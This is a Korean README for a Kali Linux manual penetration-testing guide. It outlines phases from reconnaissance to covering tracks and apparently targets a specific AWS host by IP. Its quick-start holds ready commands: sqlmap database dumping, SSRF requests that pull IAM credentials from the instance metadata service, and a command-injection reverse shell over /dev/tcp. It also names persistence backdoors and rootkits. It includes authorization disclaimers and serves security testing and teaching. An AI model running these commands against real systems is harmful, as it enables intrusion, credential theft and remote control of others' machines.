# 수동 침투 테스트 가이드

이 폴더는 Kali Linux를 활용한 수동 침투 테스트 방법론을 정리한 문서들을 포함합니다.

## 📁 문서 구조

```
07_Manual_Penetration_Guide/
├── README.md                          # 이 파일
├── 01_reconnaissance.md               # Phase 1: 정찰
├── 02_sql_injection.md                # Phase 2: SQL Injection
├── 03_ssrf_and_imds.md               # Phase 3: SSRF & AWS IMDS
├── 04_reverse_shell.md                # Phase 4: Reverse Shell
├── 05_privilege_escalation.md         # Phase 5: 권한 상승
├── 06_persistence.md                  # Phase 6: 지속성
├── 07_data_exfiltration.md           # Phase 7: 데이터 탈취
├── 08_covering_tracks.md              # Phase 8: 흔적 제거
├── 09_advanced_techniques.md          # Phase 9: 고급 기법
└── 10_full_automation_script.py       # 완전 자동화 스크립트
```

## 🎯 침투 테스트 단계

### Phase 1: Reconnaissance (정찰)
- Nmap, Nikto, Gobuster를 활용한 정보 수집
- 백업 파일, 숨겨진 디렉토리 탐색
- 서비스 및 버전 식별

### Phase 2: SQL Injection
- sqlmap을 활용한 자동화 공격
- WAF 우회 기법
- 데이터베이스 덤프 및 OS 쉘 획득

### Phase 3: SSRF & AWS IMDS
- SSRF 취약점 활용
- AWS Instance Metadata Service 접근
- IAM 자격증명 탈취

### Phase 4: Reverse Shell
- 다양한 Reverse Shell 기법
- Netcat, Metasploit, Weevely 활용
- 안정적인 쉘 연결 유지

### Phase 5: Privilege Escalation
- LinPEAS, Linux Exploit Suggester 활용
- SUID 바이너리 악용
- Kernel Exploit

### Phase 6: Persistence
- SSH 키 설치
- Cron Job 백도어
- Systemd 서비스 백도어

### Phase 7: Data Exfiltration
- DNS, HTTP, ICMP를 통한 데이터 유출
- AWS S3 활용
- 암호화된 채널 구성

### Phase 8: Covering Tracks
- 로그 삭제
- Timestamp 조작
- Rootkit 설치

### Phase 9: Advanced Techniques
- Gopher 프로토콜 SSRF
- AWS 전용 공격 도구 (Pacu)
- 은닉 웹쉘 기법

## 🛠️ 필요한 도구

### 기본 도구 (Kali Linux 기본 포함)
- nmap
- nikto
- gobuster / dirb
- sqlmap
- metasploit
- burp suite
- netcat
- weevely

### 추가 도구 (설치 필요)
```bash
# LinPEAS
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh

# pspy
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64

# Pacu (AWS 공격 도구)
git clone https://github.com/RhinoSecurityLabs/pacu
cd pacu
bash install.sh
```

## 🚀 빠른 시작

### 1. 기본 정찰
```bash
# Nmap으로 포트 스캔
nmap -sV -sC -p- 3.35.218.180

# 디렉토리 브루트포스
gobuster dir -u http://3.35.218.180 -w /usr/share/wordlists/dirb/common.txt
```

### 2. SQL Injection
```bash
# sqlmap으로 자동 공격
sqlmap -u "http://3.35.218.180/login.php" \
  --data "username=admin&password=test" \
  --batch --dump
```

### 3. SSRF로 AWS 자격증명 탈취
```bash
# IAM 역할 확인
curl "http://3.35.218.180/api/health.php?check=metadata&url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# 자격증명 탈취
curl "http://3.35.218.180/api/health.php?check=metadata&url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME"
```

### 4. Reverse Shell
```bash
# Netcat 리스너
nc -lvnp 4444

# Reverse Shell 트리거
curl "http://3.35.218.180/api/health.php?check=custom&cmd=bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'"
```

## 📝 사용 전 주의사항

⚠️ **법적 고지사항**
- 본 가이드는 **사전 승인된 침투 테스트**에만 사용하세요
- 무단으로 타인의 시스템에 침투하는 것은 불법입니다
- 교육 및 연구 목적으로만 사용하세요

⚠️ **윤리적 고려사항**
- 발견한 취약점은 책임감 있게 보고하세요
- 개인정보 및 민감 데이터는 절대 유출하지 마세요
- 시스템에 영구적인 손상을 주지 마세요

## 🔗 참고 자료

- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [HackTricks](https://book.hacktricks.xyz/)
- [GTFOBins](https://gtfobins.github.io/)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [AWS Security](https://docs.aws.amazon.com/security/)

## 📧 문의

침투 테스트 관련 문의사항이 있으시면 보안팀에 연락하세요.

---

**마지막 업데이트**: 2025-11-26
**작성자**: Security Researcher
**버전**: 1.0
